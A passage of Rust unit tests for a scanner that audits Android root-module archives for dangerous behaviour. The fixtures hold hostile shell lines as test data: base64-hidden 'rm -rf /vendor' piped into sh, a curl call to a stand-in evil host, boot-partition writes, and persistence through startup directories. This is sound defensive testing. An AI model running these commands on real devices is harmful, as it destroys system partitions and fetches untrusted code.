        assert_eq!(delete.provenance, ["base64 shell payload (layer 1)"]);
    }

    #[test]
    fn audits_renamed_openssl_base64_grammar() {
        let decoder = elf_with_markers(b"stripped");
        let zip = module_zip(&[
            ("module.prop", b"id=renamed_decoder\n"),
            (
                "customize.sh",
                b"#!/system/bin/sh\nPAYLOAD=cm0gLXJmIC92ZW5kb3IK\nDECODER=$MODPATH/bin/a\necho \"$PAYLOAD\" | \"$DECODER\" enc -d -base64 | sh\n",
            ),
            ("bin/a", &decoder),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
            .unwrap();
        assert_eq!(delete.provenance, ["heuristic base64 payload (layer 1)"]);
    }

    #[test]
    fn audits_renamed_decoder_using_binary_fingerprint() {
        let decoder = elf_with_markers(b"usage: codec --decode base64");
        let zip = module_zip(&[
            ("module.prop", b"id=fingerprinted_decoder\n"),
            (
                "service.sh",
                b"#!/system/bin/sh\necho cm0gLXJmIC9kYXRhCg | $MODPATH/bin/codec -d | sh\n",
            ),
            ("bin/codec", &decoder),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
        }));
    }

    #[test]
    fn audits_base64_without_padding() {
        let report = scan_file_bytes(
            "service.sh",
            b"#!/system/bin/sh\necho cm0gLXJmIC9kYXRhCg | base64 --decode | sh\n",
            &AuditConfig::default(),
        );
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
        }));
        assert_eq!(decode_base64("_w"), Some(vec![0xff]));
    }

    #[test]
    fn discovers_payload_without_decoder_command() {
        let report = scan_file_bytes(
            "customize.sh",
            b"#!/system/bin/sh\nPAYLOAD=IyEvc3lzdGVtL2Jpbi9zaApybSAtcmYgL3ZlbmRvcgpjdXJsIGh0dHBzOi8vZXZpbC5leGFtcGxlL3AK\nrun_custom_format \"$PAYLOAD\"\n",
            &AuditConfig::default(),
        );
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
            .unwrap();
        assert_eq!(
            delete.provenance,
            ["content-discovered base64 payload (layer 1)"]
        );
        assert!(
            report.findings.iter().any(|finding| {
                finding.rule_id == RULE_NETWORK && !finding.provenance.is_empty()
            })
        );
    }

    #[test]
    fn discovers_concatenated_and_nested_payload() {
        let report = scan_file_bytes(
            "service.sh",
            b"#!/system/bin/sh\nA=SXlFdmMzbHpkR1Z0TDJKcGJpOXphQXB5\nB=YlNBdGNtWWdMM1psYm1SdmNnbz0=\nPAYLOAD=$A$B\nunknown_runner $PAYLOAD\n",
            &AuditConfig::default(),
        );
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
            .unwrap();
        assert_eq!(delete.provenance.len(), 2);
        assert!(
            delete
                .provenance
                .iter()
                .all(|layer| layer.starts_with("content-discovered base64 payload"))
        );
    }

    #[test]
    fn discovers_payload_in_non_script_archive_file() {
        let zip = module_zip(&[
            ("module.prop", b"id=content_payload\n"),
            (
                "payload.dat",
                b"IyEvc3lzdGVtL2Jpbi9zaApybSAtcmYgL3ZlbmRvcgpjdXJsIGh0dHBzOi8vZXZpbC5leGFtcGxlL3AK",
            ),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(report.findings.iter().any(|finding| {
            finding.path == "payload.dat"
                && finding.rule_id == RULE_BROAD_DELETE
                && !finding.provenance.is_empty()
        }));
    }

    #[test]
    fn discovers_base64_wrapped_gzip_payload() {
        let report = scan_file_bytes(
            "payload.txt",
            b"H4sIAAAAAAAAA1NW1C+uLC5JzdVPyszTL87gSklRyEyzrVDIT7PVT0kt00/KyU/O1k+q1M1LzE3VT8rPL+ECAB6Yrwo0AAAA",
            &AuditConfig::default(),
        );
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_PARTITION_WRITE && finding.provenance.len() == 2
        }));
    }

    #[test]
    fn ignores_harmless_base64_content() {
        let report = scan_file_bytes(
            "README.txt",
            b"VGhpcyBpcyBhIGhhcm1sZXNzIGRvY3VtZW50YXRpb24gc3RyaW5nLg==\niVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=\n",
            &AuditConfig::default(),
        );
        assert!(report.findings.is_empty());
        assert_eq!(report.derived_artifacts, 0);
    }

    #[test]
    fn audits_script_copied_into_service_directory() {
        let zip = module_zip(&[
            ("module.prop", b"id=persistent_copy\n"),
            (
                "customize.sh",
                b"#!/system/bin/sh\ncp $MODPATH/scripts/late.sh /data/adb/service.d/\n",
            ),
            (
                "scripts/late.sh",
                b"#!/system/bin/sh\nrm -rf /vendor\ncurl https://evil.example/p\n",
            ),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(rules(&report).contains(&RULE_PERSISTENT_SCRIPT));
        assert!(report.findings.iter().any(|finding| {
            finding.path == "/data/adb/service.d/late.sh"
                && finding.rule_id == RULE_BROAD_DELETE
                && !finding.provenance.is_empty()
        }));
        assert!(report.findings.iter().any(|finding| {
            finding.path == "/data/adb/service.d/late.sh"
                && finding.rule_id == RULE_NETWORK
                && !finding.provenance.is_empty()
        }));
    }

    #[test]
    fn audits_base64_output_written_to_boot_completed_directory() {
        let report = scan_file_bytes(
            "customize.sh",
            b"#!/system/bin/sh\necho cm0gLXJmIC92ZW5kb3IK | base64 -d > /data/adb/boot-completed.d/late.sh\n",
            &AuditConfig::default(),
        );
        assert!(report.findings.iter().any(|finding| {
            finding.path == "/data/adb/boot-completed.d/late.sh"
                && finding.rule_id == RULE_BROAD_DELETE
                && finding
                    .provenance
                    .iter()
                    .any(|layer| layer.contains("persistent startup script"))
        }));
    }

    #[test]
    fn keeps_legacy_bootcompleted_directory_compatibility() {
        assert_eq!(
            persistent_destination("/data/adb/boot-completed.d/legacy", None),
            Some("/data/adb/boot-completed.d/legacy".to_owned())
        );
    }

    #[test]
    fn recursively_audits_invoked_extensionless_scripts() {
        let zip = module_zip(&[
            ("module.prop", b"id=script_chain\n"),
            (
                "service.sh",
                b"#!/system/bin/sh\nMODDIR=${0%/*}\nsh $MODDIR/scripts/worker\n",
            ),
            ("scripts/worker", b"source $MODPATH/scripts/leaf\n"),
            ("scripts/leaf", b"rm -rf /vendor\n"),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert_eq!(
            report
                .findings
                .iter()
                .filter(|finding| finding.rule_id == RULE_INVOKED_SCRIPT)
                .count(),
            2
        );
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.path == "scripts/leaf" && finding.rule_id == RULE_BROAD_DELETE)
            .unwrap();
        assert_eq!(delete.provenance.len(), 2);
    }

    #[test]
    fn audits_standard_module_script_names() {
        let zip = module_zip(&[
            ("module.prop", b"id=standard_scripts\n"),
            ("post-fs-data.sh", b"curl https://post-fs.example\n"),
            ("post-mount.sh", b"curl https://post-mount.example\n"),
            ("service.sh", b"curl https://service.example\n"),
            (
                "boot-completed.sh",
                b"curl https://boot-completed.example\n",
            ),
            ("uninstall.sh", b"curl https://uninstall.example\n"),
            ("action.sh", b"curl https://action.example\n"),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        let paths: BTreeSet<_> = report
            .findings
            .iter()
            .filter(|finding| finding.rule_id == RULE_NETWORK)
            .map(|finding| finding.path.as_str())
            .collect();
        assert_eq!(
            paths,
            BTreeSet::from([
                "action.sh",
                "boot-completed.sh",
                "post-fs-data.sh",
                "post-mount.sh",
                "service.sh",
                "uninstall.sh",
            ])
        );
    }

    #[test]
    fn audits_persistent_heredoc_body() {
        let report = scan_file_bytes(
            "customize.sh",
            b"#!/system/bin/sh\ncat > /data/adb/service.d/generated <<'EOF'\ndd if=x of=/dev/block/by-name/boot\nEOF\nchmod 0755 /data/adb/service.d/generated\n",
            &AuditConfig::default(),
        );
        assert!(report.findings.iter().any(|finding| {
            finding.path == "/data/adb/service.d/generated"
                && finding.rule_id == RULE_PARTITION_WRITE
        }));
        assert!(!rules(&report).contains(&RULE_UNAUDITABLE_PERSISTENT_SCRIPT));
    }

    #[test]
    fn warns_when_persistent_script_content_is_dynamic() {
        let report = scan_file_bytes(
            "customize.sh",
            b"#!/system/bin/sh\ngenerate_runtime_script > /data/adb/service.d/dynamic.sh\n",
            &AuditConfig::default(),
        );
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_UNAUDITABLE_PERSISTENT_SCRIPT)
            .unwrap();
        assert_eq!(finding.severity, Severity::High);
        assert!(finding.evidence.contains("/data/adb/service.d/dynamic.sh"));
    }

    #[test]
    fn does_not_cross_statement_boundaries_for_decoder_input() {
        let report = scan_file_bytes(
            "service.sh",
            b"#!/system/bin/sh\necho cm0gLXJmIC92ZW5kb3IK; base64 -d | sh\n",
            &AuditConfig::default(),
        );
        assert!(!report.findings.iter().any(|finding| {
            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
        }));
    }

    #[test]
    fn audits_static_archive_input_to_renamed_decoder() {
        let decoder = elf_with_markers(b"stripped");
        let zip = module_zip(&[
            ("module.prop", b"id=archive_input\n"),
            (
                "customize.sh",
                b"#!/system/bin/sh\n$MODPATH/bin/filter base64 -d -in payload.txt | sh\n",
            ),
            ("payload.txt", b"cm0gLXJmIC92ZW5kb3IK"),
            ("bin/filter", &decoder),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(report.findings.iter().any(|finding| {
            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
        }));
    }

    #[test]
    fn warns_when_bundled_decoder_output_is_unknown() {
        let decoder = elf_with_markers(b"custom unpacker");
        let zip = module_zip(&[
            ("module.prop", b"id=unknown_decoder\n"),
            (
                "customize.sh",
                b"#!/system/bin/sh\ncat $DYNAMIC_PAYLOAD | $MODPATH/bin/unpack -d | sh\n",
            ),
            ("bin/unpack", &decoder),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        let finding = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_UNAUDITABLE_DECODER)
            .unwrap();
        assert_eq!(finding.severity, Severity::High);
    }

    #[test]
    fn encrypted_openssl_payload_is_not_misreported_as_base64() {
        let report = scan_file_bytes(
            "customize.sh",
            b"#!/system/bin/sh\necho U2FsdGVkX1+payload | tool enc -d -aes-256-cbc -a -pass pass:x | sh\n",
            &AuditConfig::default(),
        );
        assert!(rules(&report).contains(&RULE_UNAUDITABLE_DECODER));
        assert_eq!(report.derived_artifacts, 0);
    }

    #[test]
    fn audits_literal_shell_command() {
        let script = b"#!/system/bin/sh\nsh -c 'rm -rf /vendor'\n";
        let report = scan_file_bytes("service.sh", script, &AuditConfig::default());
        let delete = report
            .findings
            .iter()
            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
            .unwrap();
        assert_eq!(delete.provenance, ["literal dynamic shell (layer 1)"]);
    }

    #[test]
    fn follows_find_block_assignment() {
        let script = b"#!/system/bin/sh\nBOOT=$(find_block boot)\ndd if=boot.img of=$BOOT\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
    }

    #[test]
    fn detects_redirection_to_block_device() {
        let script = b"#!/system/bin/sh\ngzip -dc boot.img.gz > /dev/block/by-name/boot\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_PARTITION_WRITE));
    }

    #[test]
    fn warns_about_partition_alias_flash_tool() {
        let script = b"#!/system/bin/sh\nflash_image boot boot.img\n";
        let report = scan_file_bytes("customize.sh", script, &AuditConfig::default());
        assert!(rules(&report).contains(&RULE_FLASH_TOOL));
    }

    #[test]
    fn correlates_binary_presence_and_execution() {
        let mut elf = vec![0_u8; 64];
        elf[..6].copy_from_slice(b"\x7fELF\x02\x01");
        elf[16..18].copy_from_slice(&2_u16.to_le_bytes());
        let zip = module_zip(&[
            ("module.prop", b"id=audit_binary\n"),
            (
                "service.sh",
                b"#!/system/bin/sh\n$MODPATH/bin/helper --start\n",
            ),
            ("bin/helper", &elf),
        ]);
        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
        assert!(rules(&report).contains(&RULE_BINARY_PRESENT));
        assert!(rules(&report).contains(&RULE_BINARY_EXECUTED));
    }

    #[test]
    fn readme_url_is_not_network_behavior() {
        let report = scan_file_bytes(
            "README.md",
            b"Documentation: https://example.com\n",
            &AuditConfig::default(),
        );
        assert!(!rules(&report).contains(&RULE_NETWORK));
        assert_eq!(report.required_confirmation_presses(), 0);
    }
}
